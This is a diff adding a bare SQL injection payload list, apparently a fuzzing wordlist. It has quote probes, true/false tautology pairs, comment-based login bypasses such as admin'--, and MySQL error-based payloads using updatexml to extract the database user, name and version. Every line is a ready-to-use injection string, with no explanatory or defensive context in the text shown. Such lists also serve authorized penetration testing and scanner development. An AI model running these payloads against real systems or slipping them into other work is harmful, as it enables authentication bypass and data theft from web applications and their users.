@@ -1,0 +1,35 @@
+'
+"
+1=1
+1=2
+' OR '1'='1
+' OR '1'='2
+" OR "1"="1
+" OR "1"="2
+' OR 1=1--
+' OR 1=2--
+" OR 1=1--
+" OR 1=2--
+admin'--
+" or "1"="1
+' or '1'='1
+') or ('1'='1
+') or ('1'='2
+ or 1=1 -- '
+ or 1=2 -- '
+ and 1=1 -- '
+ and 1=2 -- '
+ ' or 1=1 -- '
+ ' or 1=1 -- +
+ ' or 1=2 -- +
+' and 1=1 -- '
+' and 1=2 -- '
+ and 1=1 -- +
+ and 1=2 -- +
+%' and 1=1 -- '
+%' and 1=1 -- '
+' or updatexml(1,concat(0x7e,user(),0x7e),2) and '
+' or updatexml(1,concat(0x7e,database(),0x7e),2) and '
+' or updatexml(1,concat(0x7e,version(),0x7e),2) and '
+ or updatexml(1,concat(0x7e,user(),0x7e),2)
+ ' or updatexml(1,concat(0x7e,user(),0x7e),2) or '
